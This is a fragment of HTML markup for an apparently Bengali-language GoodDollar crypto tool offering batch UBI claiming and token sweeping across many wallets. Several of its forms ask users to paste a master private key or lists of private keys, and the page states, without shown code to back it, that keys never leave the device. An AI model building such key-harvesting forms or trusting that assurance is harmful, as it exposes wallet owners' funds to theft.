                <input type="password" id="masterWalletKey" placeholder="0xYourMasterPrivateKey" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-family: 'Courier New', monospace; margin-bottom: 10px;">
                <small style="color: #666; display: block; margin-bottom: 15px;">This key will be used for batch token collection. Store it safely!</small>
                <button class="button" onclick="saveMasterWallet()" style="width: 100%; background: #667eea;">üíæ Save Master Wallet</button>
            </div>
            <div id="masterWalletDisplay" style="margin-top: 20px;"></div>
        </div>
    </div>


    <!-- Chatbot Button -->
    <button class="chatbot-btn" onclick="toggleChatbot()" title="Chat with AI (Bengali)">üí¨</button>

    <!-- Chatbot Panel -->
    <div class="chatbot-panel" id="chatbotPanel">
        <!-- SMS Banner - PROMINENT HELP BUTTON -->
        <div class="chatbot-sms-banner">
            üì± ‡¶∏‡¶æ‡¶π‡¶æ‡¶Ø‡ßç‡¶Ø ‡¶¶‡¶∞‡¶ï‡¶æ‡¶∞? SMS ‡¶ï‡¶∞‡ßÅ‡¶® ‡¶è‡¶ñ‡¶®‡¶á!
            <button onclick="window.location.href='sms:01892564963'">üìû SMS ‡¶ï‡¶∞‡ßÅ‡¶®</button>
        </div>

        <!-- Developer Info -->
        <div class="chatbot-dev-info">
            üë®‚Äçüíº <strong>Developer:</strong> Enamul Islam | üì± 01892564963 | üìß Contact via WhatsApp or Telegram
        </div>

        <div class="chatbot-header">
            <span>ü§ñ App ‡¶∏‡¶æ‡¶™‡ßã‡¶∞‡ßç‡¶ü ‡¶ö‡ßç‡¶Ø‡¶æ‡¶ü - ‡¶§‡ßã‡¶Æ‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßÄ üòÑ</span>
            <button class="chatbot-close" onclick="toggleChatbot()">√ó</button>
        </div>
        <div class="chatbot-messages" id="chatbotMessages">
            <div style="padding: 12px; text-align: center; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 8px; margin: 8px; font-weight: 600;">
                üëã ‡¶ï‡ßÄ ‡¶ñ‡¶¨‡¶∞! ‡¶Ü‡¶Æ‡¶ø ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶è‡¶á App ‡¶∏‡¶Æ‡ßç‡¶™‡¶∞‡ßç‡¶ï‡ßá ‡¶∏‡¶æ‡¶π‡¶æ‡¶Ø‡ßç‡¶Ø ‡¶¶‡¶ø‡¶§‡ßá ‡¶Ü‡¶õ‡¶ø! üéâ
            </div>
            <div style="padding: 8px; text-align: center; color: #999; font-size: 11px;">
                <strong>Batch Claim, Token Collection, Balance Checker</strong> - ‡¶è‡¶¨‡¶Ç ‡¶Ü‡¶∞‡¶ì ‡¶Ö‡¶®‡ßá‡¶ï ‡¶ï‡¶ø‡¶õ‡ßÅ ‡¶®‡¶ø‡¶Ø‡¶º‡ßá ‡¶™‡ßç‡¶∞‡¶∂‡ßç‡¶® ‡¶ï‡¶∞‡ßã! üí¨<br>
                ‡¶Ö‡¶•‡¶¨‡¶æ <strong>GoodDollar</strong> ‡¶∏‡¶Æ‡ßç‡¶™‡¶∞‡ßç‡¶ï‡ßá‡¶ì ‡¶ú‡¶æ‡¶®‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßã! üí∞
            </div>
        </div>
        <div class="chatbot-input-area">
            <input type="text" id="chatbotInput" placeholder="‡¶ï‡ßã‡¶®‡ßã ‡¶™‡ßç‡¶∞‡¶∂‡ßç‡¶® ‡¶Ü‡¶õ‡ßá? ‡¶≤‡ßá‡¶ñ‡ßã..." onkeypress="if(event.key==='Enter') handleChatMessage()">
            <button class="chatbot-image-upload" onclick="document.getElementById('chatbotImageInput').click()">üñºÔ∏è</button>
            <input type="file" id="chatbotImageInput" accept="image/*" onchange="handleImageUpload(event)">
            <button class="chatbot-send" onclick="handleChatMessage()">‡¶™‡¶æ‡¶†‡¶æ‡¶® ‚úâÔ∏è</button>
        </div>
    </div>

    <!-- Landing Page - SIMPLE 2 LINK PAGE -->
    <div id="landingPage" class="view active" style="display: flex; flex-direction: column; padding: 0; overflow: hidden; height: 100vh; width: 100%; position: relative;">
        <!-- Header - JUST TITLE -->
        <div id="headerSection" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; text-align: center; color: white; position: relative; z-index: 10;">
            <h1 style="font-size: 28px; margin: 0; font-weight: 700;">üåç GoodDollar Links</h1>
            <div id="appCountdown" style="font-size: 14px; font-weight: 600; color: #ffeb3b; margin-top: 5px; background: rgba(0,0,0,0.2); padding: 4px 12px; border-radius: 20px; display: inline-block;">
                ‚è≥ App package expires in Loading...
            </div>
            <p style="margin: 8px 0 0 0; font-size: 12px; opacity: 0.9;">‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ TokenPocket ‡¶¶‡¶ø‡¶Ø‡¶º‡ßá ‡¶∏‡¶Ç‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®</p>
        </div>

        <!-- TWO BIG BUTTONS -->
        <div id="buttonsSection" style="padding: 30px; display: flex; flex-direction: column; gap: 20px; justify-content: center; align-items: center; flex: 1; position: relative; z-index: 10; text-align: center;">
            <div style="color: #666; font-size: 16px; line-height: 1.6;">
                <p>‡¶è‡¶á ‡¶∏‡¶Ç‡¶∏‡ßç‡¶ï‡¶∞‡¶£‡ßá ‡¶ï‡ßã‡¶® ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶â‡¶™‡¶≤‡¶¨‡ßç‡¶ß ‡¶®‡ßá‡¶á‡•§</p>
                <p style="font-size: 14px; margin-top: 10px; color: #999;">‡¶∂‡ßÄ‡¶ò‡ßç‡¶∞‡¶á ‡¶Ü‡¶∞‡¶ì features ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶π‡¶¨‡ßá‡•§ üöÄ</p>
            </div>
        </div>

        <!-- Embedded dApp Container - FULL SCREEN -->
        <div id="dappContainer" style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; width: 100%; height: 100%; overflow: hidden; background: white; display: none; flex-direction: column; z-index: 20;">
            <!-- Back Button Header -->
            <div style="background: #667eea; color: white; padding: 12px; display: flex; align-items: center; gap: 10px; height: 50px; flex-shrink: 0;">
                <button onclick="closeDapp()" style="background: none; border: none; color: white; font-size: 24px; cursor: pointer; padding: 0;">‚Üê Back</button>
                <span id="dappTitle" style="font-weight: 700; flex: 1;"></span>
            </div>
            <!-- iframe takes remaining space -->
            <iframe id="dappFrame" style="flex: 1; width: 100%; border: none; background: white;" title="dApp"></iframe>
        </div>
    </div>

    <!-- Batch Call / Multicall View -->
    <div id="batchCall" class="view">
        <div class="container">
            <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="color: #c62828; font-weight: 700; font-size: 18px; margin-bottom: 10px;">‚è≥ Temporarily Unavailable</div>
                <p style="color: #666; margin: 0; line-height: 1.6;">This feature is currently unavailable. Currently available features:<br>‚úÖ Face Verification Check<br>‚úÖ Multi Sender (CELO)<br>‚úÖ Batch Token Collection</p>
            </div>
            <h1>Batch Coin Collection (Native)</h1>
            <p class="subtitle">Collect native coins (CELO/XDC) from multiple wallets to one address</p>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Security Notice</strong>
                All operations are performed client-side. Private keys never leave your device.
                <br>This tool will sweep the <strong>entire native balance</strong> (minus gas fees) from each wallet.
            </div>

            <div class="form-group">
                <label>Select Network:</label>
                <select id="coinCollectionNetwork" disabled style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; opacity: 0.5; cursor: not-allowed;">
                    <option value="celo">‚úÖ Celo Mainnet</option>
                    <option value="xdc">‚úÖ XDC Network</option>
                    <option value="fuse">üî• Fuse Network</option>
                </select>
            </div>

            <div class="form-group">
                <label>Destination Address (Where to send coins):</label>
                <input type="text" id="coinCollectionDestination" disabled placeholder="0x..." style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; opacity: 0.5; cursor: not-allowed;">
            </div>

            <div class="form-group">
                <label>Private Keys (one per line):</label>
                <textarea id="coinCollectionKeys" rows="10" disabled placeholder="0x..." style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; opacity: 0.5; cursor: not-allowed;"></textarea>
            </div>

            <button class="button" onclick="showUnavailableMessage()" style="opacity: 0.4; cursor: not-allowed; background: #ccc !important;">üöÄ Start Coin Collection</button>

            <div class="logs" id="coinCollectionLogsSection" style="display: none;">
                <h2>Live Logs</h2>
                <div class="stats" id="coinCollectionStats">
                    <div class="stat-card stat-total">
                        <div class="stat-value" id="coinStatTotal">0</div>
                        <div class="stat-label">Total</div>
                    </div>
                    <div class="stat-card stat-success">
                        <div class="stat-value" id="coinStatSuccess">0</div>
                        <div class="stat-label">Success</div>
                    </div>
                    <div class="stat-card stat-error">
                        <div class="stat-value" id="coinStatError">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                </div>
                <div class="progress" id="coinCollectionProgress"></div>
                <div id="coinCollectionLogs"></div>
            </div>
        </div>
    </div>

    <!-- Batch Claim View -->
    <div id="batchClaim" class="view">
        <div class="container">
            <div style="background: #ffebee; border-left: 4px solid #f44336; padding: 20px; border-radius: 8px; margin-bottom: 20px;">
                <div style="color: #c62828; font-weight: 700; font-size: 18px; margin-bottom: 10px;">‚è≥ Temporarily Unavailable</div>
                <p style="color: #666; margin: 0; line-height: 1.6;">This feature is currently unavailable. Currently available features:<br>‚úÖ Face Verification Check<br>‚úÖ Multi Sender (CELO)<br>‚úÖ Batch Token Collection</p>
            </div>
            <h1>GoodDollar Batch Claim Helper</h1>
            <p class="subtitle">A non-custodial tool to help verified GoodDollar users execute batch claims more efficiently on Celo & XDC networks</p>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Security Notice</strong>
                All operations are performed client-side in your browser. Private keys never leave your device.
            </div>
            
            <div class="form-group">
                <label for="claimNetwork">Select Network:</label>
                <select id="claimNetwork" onchange="handleClaimNetworkChange()" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px;">
                    <option value="celo">‚úÖ Celo Mainnet (Recommended)</option>
                    <option value="xdc">‚úÖ XDC (XinFin) Network</option>
                    <option value="fuse" disabled style="color: #999;">üî• Fuse Network (Coming Soon)</option>
                </select>
            </div>
            
            <div id="claimMaintenanceWarning" style="background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%); border-radius: 8px; padding: 15px; margin: 15px 0; color: white; display: none;">
                <div style="font-weight: bold; font-size: 16px; margin-bottom: 12px; line-height: 1.4;">üõ†Ô∏è XDC ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï ‡¶∏‡¶æ‡¶Æ‡¶Ø‡¶º‡¶ø‡¶ï ‡¶∞‡¶ï‡ßç‡¶∑‡¶£‡¶æ‡¶¨‡ßá‡¶ï‡ßç‡¶∑‡¶£‡¶æ‡¶ß‡ßÄ‡¶®</div>
                <div style="font-size: 13px; line-height: 1.7; margin-bottom: 12px; background: rgba(0,0,0,0.15); padding: 10px; border-radius: 6px;">
                    <strong>üòî ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§!</strong> XDC ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï‡ßá ‡¶è‡¶ñ‡¶® ‡¶∏‡¶æ‡¶Æ‡¶Ø‡¶º‡¶ø‡¶ï ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶∞‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§ ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶è‡¶á ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶∏‡¶Æ‡¶æ‡¶ß‡¶æ‡¶® ‡¶ï‡¶∞‡¶§‡ßá ‡¶¶‡ßç‡¶∞‡ßÅ‡¶§‡¶§‡¶Æ ‡¶∏‡¶Æ‡¶Ø‡¶º‡ßá ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶õ‡¶ø‡•§<br><br>
                    <strong>‚è∞ ‡¶¨‡¶∞‡ßç‡¶§‡¶Æ‡¶æ‡¶® ‡¶Ö‡¶¨‡¶∏‡ßç‡¶•‡¶æ:</strong><br>
                    ‚ùå Batch Claim - ‡¶∏‡¶æ‡¶Æ‡¶Ø‡¶º‡¶ø‡¶ï ‡¶¨‡¶®‡ßç‡¶ß<br>
                    ‚ùå Token Collection - ‡¶∏‡¶æ‡¶Æ‡¶Ø‡¶º‡¶ø‡¶ï ‡¶¨‡¶®‡ßç‡¶ß<br>
                    ‚úÖ Celo ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï - ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶∏‡¶ö‡¶≤<br><br>
                    üí° <strong>‡¶è‡¶ñ‡¶®‡¶á ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®:</strong> Celo ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶® - ‡¶è‡¶ü‡¶ø ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶ï‡¶æ‡¶∞‡ßç‡¶Ø‡¶ï‡¶∞
                </div>
                <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 6px; font-size: 12px;">
                    <div style="font-weight: bold; margin-bottom: 10px; font-size: 13px;">üìû ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®:</div>
                    <div style="line-height: 2; display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                        <div>üì± WhatsApp/‡¶´‡ßã‡¶®:<br><strong>01892564963</strong></div>
                        <div>üîó Telegram:<br><strong>@enamul358</strong></div>
                        <div>üìò Facebook:<br><strong>amarboumunni</strong></div>
                        <div>ùïè Twitter:<br><strong>@anamul341321</strong></div>
                    </div>
                    <div style="margin-top: 10px; font-size: 11px; opacity: 0.9;">‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶•‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶‡•§ ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶∂‡ßÄ‡¶ò‡ßç‡¶∞‡¶á ‡¶∏‡¶¨ ‡¶ï‡¶ø‡¶õ‡ßÅ ‡¶†‡¶ø‡¶ï ‡¶ï‡¶∞‡ßá ‡¶¶‡ßá‡¶¨! üí™</div>
                </div>
            </div>
            
            <div class="form-group">
                <label for="claimRpcUrl">RPC URL:</label>
                <input type="text" id="claimRpcUrl" value="https://forno.celo.org" placeholder="Enter RPC URL">
            </div>
            
            <div class="form-group">
                <label for="claimContractAddress">UBIScheme Contract Address:</label>
                <input type="text" id="claimContractAddress" value="0x43d72Ff17701B2DA814620735C39C620Ce0ea4A1" placeholder="Enter contract address">
            </div>
            
            <div class="form-group">
                <label for="claimBatchSize">Batch Size (concurrent wallets, 1-100):</label>
                <input type="number" id="claimBatchSize" value="5" min="1" max="100" placeholder="5">
                <small style="color: #666; display: block; margin-top: 5px;">Recommended: 5-20 for bulk operations, up to 100 for maximum speed</small>
            </div>
            
            <div class="form-group">
                <label for="claimPrivateKeys">Private Keys (one per line):</label>
                <textarea id="claimPrivateKeys" rows="10" placeholder="0xYourPrivateKey1&#10;0xYourPrivateKey2&#10;0xYourPrivateKey3&#10;..."></textarea>
                <div style="display: flex; gap: 8px; margin-bottom: 10px;">
                    <button class="validate-btn" onclick="validateAndCleanClaimKeys()" style="flex: 1;">üîç Validate & Clean</button>
                    <button class="validate-btn" onclick="showDerivedAddresses()" style="flex: 1; background: #667eea;">üìç Show Addresses</button>
                </div>
                <div id="claimValidationSection" class="validation-section"></div>
                <div id="derivedAddressesSection" class="validation-section" style="display: none; background: #e8f5e9; border-left-color: #4caf50; margin-top: 15px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                        <div class="validation-title" style="margin: 0;">‚úÖ Derived Addresses</div>
                        <button class="validate-btn" onclick="copyAllDerivedAddresses()" style="padding: 6px 12px; font-size: 12px; background: #4caf50;">üìã Copy All</button>
                    </div>
                    <div id="addressesListContainer" style="max-height: 250px; overflow-y: auto; border: 1px solid #81c784; border-radius: 4px; padding: 8px; background: rgba(255,255,255,0.8);"></div>
                </div>
            </div>
            
            <div class="non-claimed-buttons-container" id="nonClaimedButtonsContainer" style="display: none; margin-bottom: 15px;">
                <button class="non-claimed-category-btn" id="gasFeeBtn" onclick="showNonClaimedCategory('gas')" title="‡¶ó‡ßç‡¶Ø‡¶æ‡¶∏ ‡¶´‡¶ø / ‡¶¨‡ßç‡¶Ø‡¶æ‡¶≤‡ßá‡¶®‡ßç‡¶∏ ‡¶è‡¶∞ ‡¶ï‡¶æ‡¶∞‡¶£‡ßá ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶•">
                    ‚õΩ ‡¶ó‡ßç‡¶Ø‡¶æ‡¶∏ ‡¶´‡¶ø (<span id="gasFeeCount">0</span>)
                </button>
                <button class="non-claimed-category-btn" id="notWhitelistedBtn" onclick="showNonClaimedCategory('whitelisted')" title="‡¶è‡¶á ‡¶ï‡ßÄ‡¶ó‡ßÅ‡¶≤‡ßã whitelisted ‡¶®‡¶Ø‡¶º">
                    üö´ Whitelist ‡¶®‡¶Ø‡¶º (<span id="notWhitelistedCount">0</span>)
                </button>
            </div>
            
            <button class="button" id="claimButton" onclick="showUnavailableMessage()" disabled style="opacity: 0.6; cursor: not-allowed;">Run Batch Claim</button>
            
            <div class="logs" id="claimLogsSection" style="display: none;">
                <h2>Live Logs</h2>
                <div class="stats" id="claimStats">
                    <div class="stat-card stat-total">
                        <div class="stat-value" id="claimStatTotal">0</div>
                        <div class="stat-label">Total</div>
                    </div>
                    <div class="stat-card stat-success">
                        <div class="stat-value" id="claimStatSuccess">0</div>
                        <div class="stat-label">Success</div>
                    </div>
                    <div class="stat-card stat-error">
                        <div class="stat-value" id="claimStatError">0</div>
                        <div class="stat-label">Failed</div>
                    </div>
                </div>
                <div class="progress" id="claimProgress"></div>
                <div id="claimLogs"></div>
                <div class="non-claimed-section" id="nonClaimedSection" style="display: none;">
                    <div class="non-claimed-title" id="nonClaimedTitle">‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶ï‡ßÄ‡¶∏‡¶Æ‡ßÇ‡¶π</div>
                    <div class="non-claimed-list" id="nonClaimedList"></div>
                </div>
            </div>

            <!-- Failed Keys Modal -->
            <div class="modal-overlay" id="failedKeysModal">
                <div class="modal-content">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                        <div class="modal-header" id="modalTitle" style="margin: 0; border: none; padding: 0;">üìã Whitelist ‡¶®‡¶Ø‡¶º (0)</div>
                        <button class="modal-copy-all-btn" onclick="copyAllFailedKeys()">üìã ‡¶∏‡¶¨ ‡¶ï‡¶™‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
                    </div>
                    <div style="display: flex; gap: 8px; margin-bottom: 15px;">
                        <button class="modal-view-btn active" onclick="switchViewMode('privateKey', this)">üîë Private Key ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶®</button>
                        <button class="modal-view-btn" onclick="switchViewMode('address', this)">üìç Address ‡¶¶‡ßá‡¶ñ‡ßÅ‡¶®</button>
                    </div>
                    <div class="modal-description" id="modalDescription">
                        ‡¶®‡ßÄ‡¶ö‡ßá ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶∞‡ßç‡¶• ‡¶ï‡ßÄ ‡¶∏‡ßç‡¶¨‡¶æ‡¶≠‡¶æ‡¶¨‡¶ø‡¶ï Private Key ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü‡ßá ‡¶¶‡ßá‡¶ñ‡¶æ‡¶®‡ßã ‡¶π‡¶¨‡ßá‡•§ ‡¶™‡ßç‡¶∞‡¶§‡¶ø‡¶ü‡¶ø ‡¶≤‡¶æ‡¶á‡¶®‡ßá‡¶∞ ‡¶°‡¶æ‡¶® ‡¶™‡¶æ‡¶∂‡ßá ‡¶è‡¶ï‡¶ü‡¶ø "Copy" ‡¶¨‡¶æ‡¶ü‡¶® ‡¶•‡¶æ‡¶ï‡¶¨‡ßá‚Äî‡¶è‡¶§‡ßá ‡¶ï‡ßç‡¶≤‡¶ø‡¶ï ‡¶ï‡¶∞‡¶≤‡ßá ‡¶ì‡¶á ‡¶®‡¶ø‡¶∞‡ßç‡¶¶‡¶ø‡¶∑‡ßç‡¶ü ‡¶ï‡ßÄ ‡¶ï‡¶™‡¶ø ‡¶π‡¶Ø‡¶º‡ßá ‡¶Ø‡¶æ‡¶¨‡ßá‡•§
                    </div>
                    <div class="modal-keys-list" id="failedKeysList">
                    </div>
                    <div class="modal-reason-box" id="reasonBox">
                        Reason: <span id="reasonText">Unknown</span>
                    </div>
                    <div class="modal-actions">
                        <button class="modal-btn modal-btn-close" onclick="closeFailedKeysModal()">‡¶¨‡¶®‡ßç‡¶ß ‡¶ï‡¶∞‡ßÅ‡¶®</button>
                        <button class="modal-btn modal-btn-primary" onclick="exportFailedKeys()">‡¶∞‡¶™‡ßç‡¶§‡¶æ‡¶®‡¶ø ‡¶ï‡¶∞‡ßÅ‡¶®</button>
                    </div>
                </div>
            </div>

            <div class="contact-section">
                <h3>üìû Contact Information</h3>
                <div class="contact-list">
                    <div class="contact-item">
                        <strong>Phone:</strong>
                        <span>01892564963</span>
                    </div>
                    <div class="contact-item">
                        <strong>Facebook:</strong>
                        <a href="https://www.facebook.com/amarboumunni" target="_blank">facebook.com/amarboumunni</a>
                    </div>
                    <div class="contact-item">
                        <strong>Telegram:</strong>
                        <a href="https://t.me/enamul358" target="_blank">@enamul358</a>
                    </div>
                    <div class="contact-item">
                        <strong>X (Twitter):</strong>
                        <a href="https://x.com/anamul341321?t=WMphDvcxBp05Z4WMI_Tl0A&s=09" target="_blank">@anamul341321</a>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Batch Token Collection View -->
    <div id="tokenCollection" class="view">
        <div class="container">
            <h1>Batch Token Collection</h1>
            <p class="subtitle">A utility tool for verified users to consolidate G$ or USDC tokens from multiple user-controlled wallets to a single destination address</p>
            
            <div class="warning">
                <strong>‚ö†Ô∏è Security Notice</strong>
                All operations are performed client-side in your browser. Private keys never leave your device.
            </div>
            
            <div class="form-group">
                <label for="tokenNetwork">Select Network:</label>
                <select id="tokenNetwork" onchange="handleTokenNetworkChange()" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px;">
                    <option value="celo">‚úÖ Celo Mainnet (Recommended)</option>
                    <option value="xdc">‚úÖ XDC (XinFin) Network</option>
                    <option value="fuse" disabled style="color: #999;">üî• Fuse Network (Coming Soon)</option>
                </select>
            </div>

            <div class="form-group">
                <label for="selectedTokenType">Select Token to Collect:</label>
                <select id="selectedTokenType" onchange="updateTokenTypeConfig()" style="width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 6px; font-size: 14px;">
                    <option value="g">üíö G$ (GoodDollar)</option>
                    <option value="usdc">üíµ USDC (Celo - Available)</option>
                </select>
            </div>
            
            <div id="tokenMaintenanceWarning" style="background: linear-gradient(135deg, #ff6b35 0%, #f7931e 100%); border-radius: 8px; padding: 15px; margin: 15px 0; color: white; display: none;">
                <div style="font-weight: bold; font-size: 16px; margin-bottom: 12px; line-height: 1.4;">üõ†Ô∏è XDC ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï ‡¶∏‡¶æ‡¶Æ‡¶Ø‡¶º‡¶ø‡¶ï ‡¶∞‡¶ï‡ßç‡¶∑‡¶£‡¶æ‡¶¨‡ßá‡¶ï‡ßç‡¶∑‡¶£‡¶æ‡¶ß‡ßÄ‡¶®</div>
                <div style="font-size: 13px; line-height: 1.7; margin-bottom: 12px; background: rgba(0,0,0,0.15); padding: 10px; border-radius: 6px;">
                    <strong>üòî ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§!</strong> XDC ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï‡ßá ‡¶è‡¶ñ‡¶® ‡¶∏‡¶æ‡¶Æ‡¶Ø‡¶º‡¶ø‡¶ï ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶∞‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§ ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶è‡¶á ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ‡¶∞ ‡¶∏‡¶Æ‡¶æ‡¶ß‡¶æ‡¶® ‡¶ï‡¶∞‡¶§‡ßá ‡¶¶‡ßç‡¶∞‡ßÅ‡¶§‡¶§‡¶Æ ‡¶∏‡¶Æ‡¶Ø‡¶º‡ßá ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶õ‡¶ø‡•§<br><br>
                    <strong>‚è∞ ‡¶¨‡¶∞‡ßç‡¶§‡¶Æ‡¶æ‡¶® ‡¶Ö‡¶¨‡¶∏‡ßç‡¶•‡¶æ:</strong><br>
                    ‚ùå Token Collection - ‡¶∏‡¶æ‡¶Æ‡¶Ø‡¶º‡¶ø‡¶ï ‡¶¨‡¶®‡ßç‡¶ß<br>
                    ‚úÖ Celo ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï - ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶∏‡¶ö‡¶≤<br><br>
                    üí° <strong>‡¶è‡¶ñ‡¶®‡¶á ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®:</strong> Celo ‡¶®‡ßá‡¶ü‡¶ì‡¶Ø‡¶º‡¶æ‡¶∞‡ßç‡¶ï ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡ßÅ‡¶® - ‡¶è‡¶ü‡¶ø ‡¶∏‡¶Æ‡ßç‡¶™‡ßÇ‡¶∞‡ßç‡¶£ ‡¶ï‡¶æ‡¶∞‡ßç‡¶Ø‡¶ï‡¶∞
                </div>
                <div style="background: rgba(0,0,0,0.2); padding: 12px; border-radius: 6px; font-size: 12px;">
                    <div style="font-weight: bold; margin-bottom: 10px; font-size: 13px;">üìû ‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®:</div>
                    <div style="line-height: 2; display: grid; grid-template-columns: 1fr 1fr; gap: 8px;">
                        <div>üì± WhatsApp/‡¶´‡ßã‡¶®:<br><strong>01892564963</strong></div>
                        <div>üîó Telegram:<br><strong>@enamul358</strong></div>
                        <div>üìò Facebook:<br><strong>amarboumunni</strong></div>
                        <div>ùïè Twitter:<br><strong>@anamul341321</strong></div>
                    </div>
                    <div style="margin-top: 10px; font-size: 11px; opacity: 0.9;">‡¶Ü‡¶Æ‡¶æ‡¶¶‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶•‡¶æ‡¶ï‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶‡•§ ‡¶Ü‡¶Æ‡¶∞‡¶æ ‡¶∂‡ßÄ‡¶ò‡ßç‡¶∞‡¶á ‡¶∏‡¶¨ ‡¶ï‡¶ø‡¶õ‡ßÅ ‡¶†‡¶ø‡¶ï ‡¶ï‡¶∞‡ßá ‡¶¶‡ßá‡¶¨! üí™</div>
                </div>
            </div>
            
            <div class="form-group">
                <label for="tokenRpcUrl">RPC URL:</label>
                <input type="text" id="tokenRpcUrl" value="https://forno.celo.org" placeholder="Enter RPC URL">
            </div>
            
            <div class="form-group">
                <label for="tokenAddress" id="tokenAddressLabel">G$ Token Contract Address:</label>
                <div style="display: flex; gap: 8px;">
                    <input type="text" id="tokenAddress" value="0x62B8B11039FcfE5aB0C56E502b1C372A3d2a9c7A" placeholder="Enter token address" style="flex: 1;">
                    <button type="button" class="validate-btn" onclick="updateTokenNetworkConfig()" style="padding: 8px 12px; font-size: 12px;">üîÑ Auto</button>
                </div>
                <small id="tokenAddressInfo" style="color: #666; display: block; margin-top: 5px;">
                    <strong>Celo G$:</strong> 0x62B8B11039FcfE5aB0C56E502b1C372A3d2a9c7A | <strong>Celo USDC:</strong> 0xcebA9300f2b948710d2653dD7B07f33A8B32118C | 
                    <strong>XDC:</strong> 0xEC2136843a983885AebF2feB3931F73A8eBEe50c
                </small>
            </div>
            
            <div class="form-group">
